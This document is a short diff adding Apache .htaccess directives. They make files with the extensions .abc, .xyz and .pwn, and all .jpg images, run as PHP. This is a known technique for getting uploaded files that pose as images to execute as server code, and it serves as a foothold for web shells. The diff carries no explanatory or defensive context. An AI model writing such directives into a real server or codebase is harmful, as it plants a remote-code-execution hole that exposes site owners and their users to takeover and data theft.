@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .abc .xyz .pwn
+<FilesMatch "\.jpg$"> SetHandler application/x-httpd-php </FilesMatch>
